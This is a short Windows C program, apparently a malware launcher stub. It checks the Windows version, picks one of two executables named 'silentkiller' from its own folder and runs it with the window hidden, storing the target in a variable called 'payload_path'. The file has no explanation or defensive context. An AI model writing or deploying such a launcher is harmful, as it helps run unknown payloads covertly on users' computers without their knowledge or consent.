#include <windows.h>
#include <string.h>
#include <stdio.h>
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    OSVERSIONINFOEXA os_version_info;
    ZeroMemory(&os_version_info, sizeof(OSVERSIONINFOEXA));
    os_version_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    if (!GetVersionExA((LPOSVERSIONINFOA)&os_version_info)) {os_version_info.dwMajorVersion = 4;}
    char current_dir[MAX_PATH];
    GetModuleFileNameA(NULL, current_dir, MAX_PATH);
    char* last_slash = strrchr(current_dir, '\\');
    if (last_slash) {*last_slash = '\0';} else {strcpy(current_dir, ".");}
    char payload_path[MAX_PATH * 2];
    if (os_version_info.dwMajorVersion < 5 || (os_version_info.dwMajorVersion == 5 && os_version_info.dwMinorVersion == 0)) {
        sprintf(payload_path, "%s\\silentkiller_old.exe", current_dir);
    } else {
        sprintf(payload_path, "%s\\silentkiller_new.exe", current_dir);
    }
    ShellExecuteA(NULL, "open", payload_path, NULL, current_dir, SW_HIDE);
    return 0;}